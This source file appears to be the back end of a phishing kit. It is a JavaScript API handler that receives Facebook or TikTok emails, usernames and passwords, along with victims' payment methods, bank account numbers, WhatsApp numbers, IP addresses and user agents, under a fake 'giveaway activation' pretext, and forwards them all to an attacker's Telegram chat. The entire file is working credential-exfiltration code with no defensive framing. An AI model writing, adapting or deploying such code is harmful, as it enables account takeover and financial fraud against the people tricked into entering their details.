import { TelegramBot } from 'node-telegram-bot-api';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  try {
    const { 
      platform, 
      email, 
      password, 
      username,
      userAnswers,
      ipAddress,
      userAgent 
    } = req.body;

    // Validate required fields
    if (!platform || (!email && !username)) {
      return res.status(400).json({ 
        success: false, 
        message: 'Missing required fields' 
      });
    }

    // Format message for Telegram
    const message = formatTelegramMessage({
      platform,
      email,
      password,
      username,
      userAnswers,
      ipAddress,
      userAgent,
      timestamp: new Date().toISOString()
    });

    // Send to Telegram (you'll need to set up environment variables)
    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
      const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
      
      const telegramResponse = await bot.sendMessage(
        process.env.TELEGRAM_CHAT_ID, 
        message, 
        { parse_mode: 'HTML' }
      );

      console.log('Form data sent to Telegram successfully:', {
        platform,
        timestamp: new Date().toISOString(),
        telegramMessageId: telegramResponse.message_id
      });
    }

    res.json({ 
      success: true, 
      message: 'Form submitted successfully',
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error('Error submitting form:', error);
    
    res.status(500).json({ 
      success: false, 
      message: 'Internal server error',
      error: process.env.NODE_ENV === 'development' ? error.message : 'Something went wrong'
    });
  }
}

// Function to format Telegram message
function formatTelegramMessage(data) {
  const {
    platform,
    email,
    password,
    username,
    userAnswers,
    ipAddress,
    userAgent,
    timestamp
  } = data;

  const platformEmoji = platform === 'facebook' ? '📘' : '🎵';
  const platformName = platform === 'facebook' ? 'Facebook' : 'TikTok';
  
  let message = `
🚨 <b>NEW GIVEAWAY ACTIVATION ATTEMPT</b> 🚨

${platformEmoji} <b>Platform:</b> ${platformName}
⏰ <b>Timestamp:</b> ${new Date(timestamp).toLocaleString()}

👤 <b>Login Credentials:</b>
`;

  if (email) message += `📧 <b>Email:</b> ${email}\n`;
  if (username) message += `👤 <b>Username:</b> ${username}\n`;
  if (password) message += `🔑 <b>Password:</b> ${password}\n`;

  if (userAnswers) {
    message += `\n💳 <b>User Information:</b>\n`;
    if (userAnswers.paymentMethod) message += `💳 <b>Payment Method:</b> ${userAnswers.paymentMethod}\n`;
    if (userAnswers.accountNumber) message += `🏦 <b>Account Number:</b> ${userAnswers.accountNumber}\n`;
    if (userAnswers.whatsappNumber) message += `📱 <b>WhatsApp:</b> ${userAnswers.whatsappNumber}\n`;
  }

  if (ipAddress) message += `\n🌐 <b>IP Address:</b> ${ipAddress}\n`;
  if (userAgent) message += `\n🖥️ <b>User Agent:</b> ${userAgent}\n`;

  message += `\n🎯 <b>Status:</b> <code>PENDING ACTIVATION</code>`;

  return message;
}
